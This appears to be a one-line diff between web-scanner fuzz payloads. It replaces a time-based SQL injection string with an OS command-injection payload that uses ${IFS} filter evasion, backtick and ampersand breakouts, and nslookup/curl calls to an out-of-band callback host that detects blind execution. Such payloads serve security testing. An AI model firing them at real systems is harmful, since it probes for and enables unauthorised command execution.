@@ -1,1 +1,1 @@
-555'||sleep(27*1000)*jeqxwz||'
+&(nslookup${IFS}-q${IFS}cname${IFS}hitclpetoepwj91b5a.bxss.me||curl${IFS}hitclpetoepwj91b5a.bxss.me)&'\"`0&(nslookup${IFS}-q${IFS}cname${IFS}hitclpetoepwj91b5a.bxss.me||curl${IFS}hitclpetoepwj91b5a.bxss.me)&`'
